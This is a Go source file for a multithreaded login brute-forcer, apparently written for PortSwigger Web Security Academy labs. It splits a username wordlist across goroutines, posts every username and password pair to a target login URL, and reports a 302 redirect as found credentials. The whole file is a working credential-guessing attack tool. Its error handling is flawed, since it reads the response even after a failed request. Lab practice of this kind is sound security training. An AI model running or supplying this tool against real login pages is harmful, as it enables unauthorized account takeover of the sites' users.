package bruteforcer

import (
	"fmt"
	"log"
	"math/rand"
	"os"
	postcalls "portswinger/brute/postCalls"
	"strings"
	"sync"
	"time"
)

func BruteForcer(urlPost string, usernames []byte, passwords []byte, threads *int) {
	index := 0
	var wg sync.WaitGroup

	fmt.Println("Initiating brute Force Attack |-_-|")

	//Spliting usernames to threads
	useranmeSplit := len(strings.Split(string(usernames), "\n")) / *threads
	var splitedUsernames []string

	for i := 0; i < *threads; i++ {
		for j := index; j < index+useranmeSplit; j++ {
			splitedUsernames = append(splitedUsernames, strings.Split(string(usernames), "\n")[j])
		}

		index += useranmeSplit
		wg.Add(1)
		go func() {
			defer wg.Done()
			found, err := brute(urlPost, splitedUsernames, &passwords)
			if err != nil {
				log.Fatal(err)
			}

			if found {
				os.Exit(0)
			}

		}()

		time.Sleep(100 * time.Millisecond)
		splitedUsernames = []string{}

	}

	//Taking rest of Strings
	if restOfStrings := len(strings.Split(string(usernames), "\n")) % *threads; restOfStrings != 0 {
		for j := index; j < index+restOfStrings; j++ {
			splitedUsernames = append(splitedUsernames, strings.Split(string(usernames), "\n")[j])
		}

		index += restOfStrings

		wg.Add(1)
		go func() {
			defer wg.Done()
			found, err := brute(urlPost, splitedUsernames, &passwords)
			if err != nil {
				log.Fatal(err)
			}

			if found {
				os.Exit(0)
			}

		}()

	}

	wg.Wait()
}

func brute(urlPost string, usernames []string, passwords *[]byte) (bool, error) {
	for _, username := range usernames {
		for _, password := range strings.Split(string(*passwords), "\n") {
			response, err := postcalls.PostCall(urlPost, username, password, rand.Intn(100000000))

			if err != nil {
				log.Println(err)
			}

			fmt.Println("username:", username, "password:", password, "HTTP:", response.StatusCode)

			if response.StatusCode == 302 {
				fmt.Println("Found it ->", "username:", username, "password:", password)
				return true, nil
			}
		}
	}

	return false, nil
}
